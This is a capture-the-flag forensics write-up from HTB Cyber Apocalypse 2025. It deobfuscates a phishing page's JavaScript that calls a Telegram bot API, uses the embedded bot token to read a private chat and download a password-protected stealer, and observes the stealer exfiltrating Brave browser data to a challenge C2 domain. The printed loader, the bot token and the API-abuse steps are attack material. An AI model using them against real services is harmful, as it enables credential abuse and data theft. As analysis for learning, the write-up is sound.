---
title: Tales for the Brave
date: 2025-03-29T20:52:57+02:00
description: Writeup for Tales for the Brave [HTB Cyber Apocalypse CTF 2025]
author: sunbather
tags:
- forensics
draft: false
---
___

## Challenge Description

In Eldoria, a once-innocent website called “Tales for the Brave” has become the focus of unsettling rumors. Some claim it may secretly trap unsuspecting visitors, leading them into a complex phishing scheme. Investigators report signs of encrypted communications and stealthy data collection beneath its friendly exterior. You must uncover the truth, and protect Eldoria from a growing threat.
**When debugging JavaScript, ensure you use a Firefox-based browser.**

## Solution

This is an incredibly cool challenge where you get a website with some kind of newsletter thing on it.
You can sign up for it and seemingly nothing happens.

![newsletter](/images/Cyber_Apocalypse_CTF_2025/newsletter.png)

Given the hint in the description, we can check out the js files in the browser's debugger tab.
We can find an `index.js` that is seemingly obfuscated and does cryptographic operations. Suspicious! File below:

```js
var _$_9b39 = (
  function (n, w) {
    var r = n.length;
    var j = [];
    for (var e = 0; e < r; e++) {
      j[e] = n.charAt(e)
    };
    for (var e = 0; e < r; e++) {
      var d = w * (e + 439) + (w % 33616);
      var a = w * (e + 506) + (w % 38477);
      var v = d % r;
      var p = a % r;
      var x = j[v];
      j[v] = j[p];
      j[p] = x;
      w = (d + a) % 3525268
    };
    var c = String.fromCharCode(127);
    var q = '';
    var m = '%';
    var t = '#1';
    var o = '%';
    var u = '#0';
    var k = '#';
    return j.join(q).split(m).join(c).split(t).join(o).split(u).join(k).split(c)
  }
) ('Ats8ep%%e6Sr%prB%feUseEynatcc4%ad', 1198358);

eval(
  CryptoJS[_$_9b39[1]][_$_9b39[0]]({
    ciphertext: CryptoJS[_$_9b39[4]][_$_9b39[3]][_$_9b39[2]](
      btoa(
        unescape(
          'bû3ÀÜ\\Q␟bð#S␓␡␔="ÔI�õ[@ÓK��¬È5\t\tfZ! [...] ¼*;(¢w£ëæ5h$�ªý␡�KëTI`²U¿␟l␓kª␐¿ì²¹©)�h�7F␗␁␎\fb␐Åô�ýE�&\\?\\\'ó¿�Éf~[C␖Ú␏�pe␏' // I truncated this payload, too large
        )
      )
    )
  }, CryptoJS[_$_9b39[4]][_$_9b39[3]][_$_9b39[2]](
    btoa(
      unescape(
        'Ûí�l±�¡G�ò�³␗¯L-²␇7)ÏT¼�'
      )
    )
  ), {
    iv: CryptoJS[_$_9b39[4]][_$_9b39[3]][_$_9b39[2]](
      btoa(
        unescape(
          'äu&␔ÊJ7/8\tüÆ\r\t0�'
        )
      )
    )
  }).toString(CryptoJS[_$_9b39[4]][_$_9b39[5]])
);
```

We can set a breakpoint at the beginning of the eval and then just step in to see what's going on.
At some point, the payloads are decrypted and we can inspect the second stage that is eval'd. Trick is to step into the `toString()` method and step in at the end of it.
Second stage shown below:

```js
var _$_8b18 = (
  function (k, j) {
    var y = k.length;
    var o = [];
    for (var m = 0; m < y; m++) {
      o[m] = k.charAt(m)
    };
    for (var m = 0; m < y; m++) {
      var b = j * (m + 143) + (j % 34726);
      var r = j * (m + 91) + (j % 23714);
      var v = b % y;
      var s = r % y;
      var f = o[v];
      o[v] = o[s];
      o[s] = f;
      j = (b + r) % 4449625
    };
    var a = String.fromCharCode(127);
    var i = '';
    var e = '%';
    var q = '#1';
    var t = '%';
    var h = '#0';
    var w = '#';
    return o.join(i).split(e).join(a).split(q).join(t).split(h).join(w).split(a)
  }
) (
  'shfnemBLlerpitrtgt%ld%DmvuFeceaEaladerletdtdtsputpnielEvae%%iansn%eimkei%guLt%d%i%tsv%ds%eltee%ewssmnnvdsaiyrroeesmlc@Feroieoel%bt%lIota',
  3827531
);
document[_$_8b18[3]](_$_8b18[14]) [_$_8b18[13]](
  _$_8b18[0],
  function (e) {
    e[_$_8b18[1]]();
    const emailField = document[_$_8b18[3]](_$_8b18[2]);
    const descriptionField = document[_$_8b18[3]](_$_8b18[4]);
    let isValid = true;
    if (!emailField[_$_8b18[5]]) {
      emailField[_$_8b18[8]][_$_8b18[7]](_$_8b18[6]);
      isValid = false;
      setTimeout(
        () => {
          return emailField[_$_8b18[8]][_$_8b18[9]](_$_8b18[6])
        },
        500
      )
    };
    if (!isValid) {
      return
    };
    const emailValue = emailField[_$_8b18[5]];
    const specialKey = emailValue[_$_8b18[11]](_$_8b18[10]) [0];
    const desc = parseInt(descriptionField[_$_8b18[5]], 10);
    f(specialKey, desc)
  }
);
;
function G(r) {
  return function () {
    var r = Array.prototype.slice.call(arguments),
    o = r.shift();
    return r.reverse().map(function (r, t) {
      return String.fromCharCode(r - o - 7 - t)
    }).join('')
  }(43, 106, 167, 103, 163, 98) + 1354343 .toString(36).toLowerCase() + 21 .toString(36).toLowerCase().split('').map(function (r) {
    return String.fromCharCode(r.charCodeAt() + - 13)
  }).join('') + 4 .toString(36).toLowerCase() + 32 .toString(36).toLowerCase().split('').map(function (r) {
    return String.fromCharCode(r.charCodeAt() + - 39)
  }).join('') + 381 .toString(36).toLowerCase().split('').map(function (r) {
    return String.fromCharCode(r.charCodeAt() + - 13)
  }).join('') + function () {
    var r = Array.prototype.slice.call(arguments),
    o = r.shift();
    return r.reverse().map(function (r, t) {
      return String.fromCharCode(r - o - 60 - t)
    }).join('')
  }(42, 216, 153, 153, 213, 187)
};
var _$_5975 = (
  function (o, u) {
    var g = o.length;
    var t = [];
    for (var w = 0; w < g; w++) {
      t[w] = o.charAt(w)
    };
    for (var w = 0; w < g; w++) {
      var z = u * (w + 340) + (u % 19375);
      var a = u * (w + 556) + (u % 18726);
      var h = z % g;
      var q = a % g;
      var b = t[h];
      t[h] = t[q];
      t[q] = b;
      u = (z + a) % 5939310
    };
    var k = String.fromCharCode(127);
    var r = '';
    var l = '%';
    var i = '#1';
    var v = '%';
    var e = '#0';
    var f = '#';
    return t.join(r).split(l).join(k).split(i).join(v).split(e).join(f).split(k)
  }
) (
  '%dimfT%mVlzx%degpatf5bfnrG%6tSiqth5at%easpi0emILmcim%e%/!=eZtnHf%e7cf+3rstO%%.D0i8p3t/Sphryoa%IL0rin%rcAeF6%nsenoYaLeQ5Natp4CrSrCGttUtZrdG%rlxe2poa2rdg=9fQs%&j_of0ButCO tb=r35DyCee8tgaCf=I=%rAQa4fe%ar0aonsGT_v/NgoPouP2%eoe%ue3tl&enTceynCtt4FBs%s/rBsAUEhradnkrstfgd?%t%xeyhcedeTo%olghXMsaocrB3aaDBr5rRa16Cjuct%cOee5lWE_ooo+Ka4%d3TysnehshstepId%%Ieoaycug:i_m=%%mjp0tgaiidoei.prn%sw1d',
  4129280
);
function f(oferkfer, icd) {
  const channel_id = - 1002496072246;
  var enc_token = _$_5975[0];
  if (
    oferkfer === G(_$_5975[1]) &&
    CryptoJS[_$_5975[7]](sequence[_$_5975[6]](_$_5975[5])) [_$_5975[4]](CryptoJS[_$_5975[3]][_$_5975[2]]) === _$_5975[8]
  ) {
    var decrypted = CryptoJS[_$_5975[12]][_$_5975[11]](
      enc_token,
      CryptoJS[_$_5975[3]][_$_5975[9]][_$_5975[10]](oferkfer),
      {
        drop: 192
      }
    ) [_$_5975[4]](CryptoJS[_$_5975[3]][_$_5975[9]]);
    var HOST = _$_5975[13] + String[_$_5975[14]](47) + String[_$_5975[14]](98) + String[_$_5975[14]](111) + String[_$_5975[14]](116) + decrypted;
    var xhr = new XMLHttpRequest();
    xhr[_$_5975[15]] = function () {
      if (xhr[_$_5975[16]] == XMLHttpRequest[_$_5975[17]]) {
        const resp = JSON[_$_5975[10]](xhr[_$_5975[18]]);
        try {
          const link = resp[_$_5975[20]][_$_5975[19]];
          window[_$_5975[23]][_$_5975[22]](link)
        } catch (error) {
          alert(_$_5975[24])
        }
      }
    };
    xhr[_$_5975[29]](
      _$_5975[25],
      HOST + String[_$_5975[14]](47) + _$_5975[26] + icd + _$_5975[27] + channel_id + _$_5975[28]
    );
    xhr[_$_5975[30]](null)
  } else {
    alert(_$_5975[24])
  }
};
;
var sequence = [];
;
function l() {
  sequence.push(this.id);
};
;
var _$_ead6 = [
  'input[class=cb]',
  'querySelectorAll',
  'length',
  'change',
  'addEventListener'
];
var checkboxes = document[_$_ead6[1]](_$_ead6[0]);
for (var i = 0; i < checkboxes[_$_ead6[2]]; i++) {
  checkboxes[i][_$_ead6[4]](_$_ead6[3], l)
}
```

Huge, again. But we can step through until we reach the `f()` function, which seems the most interesting due to the `XMLHttpRequest()` it makes.

If you accidentally step out or miss something, it's fine. Once the program is stepped through once, it remains deobfuscated, as the debugger knows the values for the variables at runtime.
This is great because it means that even if the `f()` function is not called, I can call it through the Console tab in the browser dev tools and trigger the breakpoint inside it.

So studying the `f()` function dynamically, we can see it takes the email given in the form (names it `oferker`) and the description (names it `icd`) as arguments.

It compares `oferker` with `G(_$_5975[1])`. We can just call that in the Console to see what it is. Turns out it expects `0p3r4t10n_4PT_Un10n`.

Then it checks a condition that is seemingly unsatisfiable, as far as I was able to tell:

```
CryptoJS[_$_5975[7]](sequence[_$_5975[6]](_$_5975[5])) [_$_5975[4]](CryptoJS[_$_5975[3]][_$_5975[2]]) === _$_5975[8]
```

There's some hash comparisons, so I think you have to overwrite some of those variables to pass through.
That's fine, I don't really care, we can analyze the function statically by hovering over variables from this point on,
because the debugger shows their values. We can also construct variables that haven't been assigned yet by using the Console tab to cheat.

In the end we end up with the following url where a request is made: `https://api.telegram.org/bot7767830637:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc/forwardMessage?chat_id=UNKNOWN&from_chat_id=-1002496072246&message_id=5`

The problem is the `UNKNOWN` portion of it. That is where the `icd` variable goes. And unfortunately it is not provided by the obfuscated code.
So the idea is to forward some messages to a chat I have access to or something. I looked at the telegram bot API and figured out that if I am able to forward message with id 5 to an existing chat
that the bot has permissions in, then the API returns it to me and I can read it:

```
forwardMessage

Use this method to forward messages of any kind. Service messages and messages with protected content can't be forwarded. On success, the sent Message is returned.
```

Looking through the other methods I can use, I found `getUpdates` which might show all messages.
I used `getUpdates` through the browser: `https://api.telegram.org/bot7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc/getUpdates` and got:

```
{"ok":true,"result":[{"update_id":385358201,
"message":{"message_id":12102,"from":{"id":7029814248,"is_bot":false,"first_name":"Boiz","username":"boryyy123","language_code":"en"},"chat":{"id":7029814248,"first_name":"Boiz","username":"boryyy123","type":"private"},"date":1743237485,"text":"hi"}}]}
```

So we can use one of the ids shown in the JSON as a chat id: `https://api.telegram.org/bot7767830637:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc/forwardMessage?chat_id=7029814248&from_chat_id=-1002496072246&message_id=5`.

A GET request on the url above returns this:

```
{"ok":true,"result":{"message_id":12130,"from":{"id":7767830636,"is_bot":true,"first_name":"OperationEldoriaBot","username":"OperationEldoriaBot"},"chat":{"id":7029814248,"first_name":"Boiz","username":"boryyy123","type":"private"},"date":1743276815,"forward_origin":{"type":"channel","chat":{"id":-1002496072246,"title":"Operation Eldoria","type":"channel"},"message_id":2,"date":1735896487},"forward_from_chat":{"id":-1002496072246,"title":"Operation Eldoria","type":"channel"},"forward_from_message_id":2,"forward_date":1735896487,"text":"Operation Eldoria is progressing as planned. The dissidents are becoming too confident, thinking they are untouchable behind \"secure\" tools. As protestors, they have flocked to Brave because it's open source, but that might cost them their privacy."}}
```

The entire chat log, recreated by me, is shown below:

```
Person A: Operation Eldoria is progressing as planned. The dissidents are becoming too confident, thinking they are untouchable behind "secure" tools. As protestors, they have flocked to Brave because it's open source, but that might cost them their privacy.
Person B: Interesting. Their reliance on Brave works in our favor. Send over the tool and a brief summary of its capabilities.
Person A: Oh! We should not forget to send the invitation link for this channel to the website so the rest of the parties can join. Coordination is key, and they’ll need access to our updates and tools like Brave.
Person B: https://t.me/+_eYUKZwn-p45OGNk         // <--- author's note: this group invite link is invalid btw

// A document is uploaded:
document:{"file_name":"Brave.zip","mime_type":"application/zip","file_id":"BQACAgQAAyEFAASUxwo2AAMGZ-M13hzazvwziRAafyMx_7Rx92gAAs4YAALNMcBT0DBTt6JgX1k2BA","file_unique_id":"AgADzhgAAs0xwFM","file_size":1190367}}}

Person A: This is the tool. Details:\n\n- Targets only Brave Browser users.\n- Exfiltrates the browser's local storage.\n- Operates silently and deletes traces upon execution.
Person B: Please send over the archive password.
Person A: Oh, yes! It is dr4g0nsh34rtb3l0ngst0m4l4k4r
Person B: I finished reviewing it. Looks promising! I will let my contacts know so they start distributing it. Let the operation begin!
Person A: For Lord Malakar! ⚔️
[EOF]
```

Given the above, we can gather a zip file of a malware is uploaded to the group chat, with the zip password being `dr4g0nsh34rtb3l0ngst0m4l4k4r`.
We get the zip file with `getFile`:

```
getFile

Use this method to get basic information about a file and prepare it for downloading. For the moment, bots can download files of up to 20MB in size. On success, a File object is returned. The file can then be downloaded via the link https://api.telegram.org/file/bot<token>/<file_path>, where <file_path> is taken from the response. It is guaranteed that the link will be valid for at least 1 hour. When the link expires, a new one can be requested by calling getFile again.
```

So GET on `https://api.telegram.org/bot7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc/getFile?file_id=BQACAgQAAyEFAASUxwo2AAMGZ-M13hzazvwziRAafyMx_7Rx92gAAs4YAALNMcBT0DBTt6JgX1k2BA`, returns this:

```
{"ok":true,"result":{"file_id":"BQACAgQAAyEFAASUxwo2AAMGZ-M13hzazvwziRAafyMx_7Rx92gAAs4YAALNMcBT0DBTt6JgX1k2BA","file_unique_id":"AgADzhgAAs0xwFM","file_size":1190367,"file_path":"documents/file_2.zip"}}
```

Then we can download it at `https://api.telegram.org/file/bot7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc/documents/file_2.zip`.

Finally, we have the zip. Unzipping it gives us `Brave.exe`. A malware meant to steal Brave browser data. Spin up your Windows VM and let's run it!
Sadly the malware is seemingly quite obfuscated, so my attempts to look into it with Ghidra were stopped quite quickly.

![apimon](/images/Cyber_Apocalypse_CTF_2025/apimon.png)

*(Tip: If picture is too small, right click and open the image in a new tab)*

Before running it with API Monitor, I thought about what interesting things a malware could be doing. I assumed it would access the data from the Brave browser and then send it off to a C2 server or something for collection.
So I ticked the boxes on the left for *Internet*, *Local File System*, and *Networking*. After running the malware we can see it accesses certain paths from the Brave browser to collect information.

Initially, these paths did not exist. I decided to install the Brave browser to let it create the paths automatically.
After the paths are correctly accessed, the malware contacts the `zOlsc2S65u.htb` domain, presumably to exfiltrate the data.

The domain was dead at the time of the challenge. So to figure out exactly what the malware does, I decided to emulate the C2 server locally. To do so, you can map the `zOlsc2S65u.htb` domain to your localhost by editing your `C:\Windows\System32\drivers\etc\hosts` file:

```
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost
127.0.0.1 zOlsc2S65u.htb
```

So, now I can just pop up a simple HTTP Python server that replies with status code 200 for every request:

```py
from http.server import BaseHTTPRequestHandler, HTTPServer

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Send response status code
        self.send_response(200)  # HTTP 200 OK
        self.send_header('Content-type', 'text/plain')
        self.end_headers()

        # Write response message
        self.wfile.write(b'Success!')

    def do_POST(self):
        # Send response status code for POST requests
        self.send_response(200)  # HTTP 200 OK
        self.send_header('Content-type', 'text/plain')
        self.end_headers()

        # Write response message
        self.wfile.write(b'Success!')

def run(server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler, port=31337):
    server_address = ('', port)  # Serve on all available interfaces
    httpd = server_class(server_address, handler_class)
    print(f'Starting httpd server on port {port}...')
    httpd.serve_forever()

if __name__ == "__main__":
    run()
```

Note that the port is `31337`, as that is the malware connects to in the API monitor screenshot.

Then, re-running the malware, we can see in Wireshark that an additional POST request goes through:

![wireshark](/images/Cyber_Apocalypse_CTF_2025/wireshark.png)

The POST request contains the encrypted contents of the `leveldb` file seen earlier in the API monitor screenshot.
Additionally, it contains the following bearer token:

```
Bearer Token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcm9tIjoiY29zdGkiLCJjYW1wYWlnbl9pZCI6Ik9wZXJhdGlvbiBFbGRvcmlhIDogRXhwb3NpbmcgdGhlIGJyYXZlcyIsImF1dGgiOiJVMFpTUTJVd1JsRldSamxxVFVjMWVtTkVSbmxPUjAxNFRUTk9abGxxVG05TlZ6VnJXREpKZW1KcVJtNWliRGx6VFVSQ2NrMVhOVzVZTTAxNFpFUk9lbVpSUFQwPSJ9.HelK5pTs6fenv8TKmAPrV3tzhSZm4GEAnEV9vBBtAzg
```

We can figure out by experience, or by Base64-decoding it, that this is JWT token. We can decode it with an online JWT token decoder:

```
{
  "from": "costi",
  "campaign_id": "Operation Eldoria : Exposing the braves",
  "auth": "U0ZSQ2UwRlFWRjlqTUc1emNERnlOR014TTNOZllqTm9NVzVrWDJJemJqRm5ibDlzTURCck1XNW5YM014ZEROemZRPT0="
}
```

Furthermore, the `auth` field contains a doubly-Base64-encoded payload. Decode it twice to get the flag!

## Other ideas

I had some other ideas that I tried during this challenge that might be interesting to know about:

- I spent a lot of time trying to decrypt the sent file data, because I thought the flag would be there. And because I assumed the JWT token is encrypted.
- I assumed that the file data MUST be `leveldb` and I tried to see if the temporary file the malware creates is the same. Maybe the flag is appended to it before sending or something?
- I couldn't find the flag appended on disk, so I assumed maybe it is appended in the sent payload, before encryption. I tried debugging with x64dbg and monitoring the cryptographic APIs, but couldn't figure out exactly where the payload was kept.
- Finally, I thought maybe the temporary file is sent with a flag, then deleted and recreated to trick me into thinking that the sent file is uninteresting. So I used [File Grabber](https://sourceforge.net/projects/filegrab/) to get all files written to the temporary directory. Turned out to be the same.

### Flag

```
$ echo -ne 'U0ZSQ2UwRlFWRjlqTUc1emNERnlOR014TTNOZllqTm9NVzVrWDJJemJqRm5ibDlzTURCck1XNW5YM014ZEROemZRPT0=' | base64 -d | base64 -d
HTB{APT_c0nsp1r4c13s_b3h1nd_b3n1gn_l00k1ng_s1t3s}
```

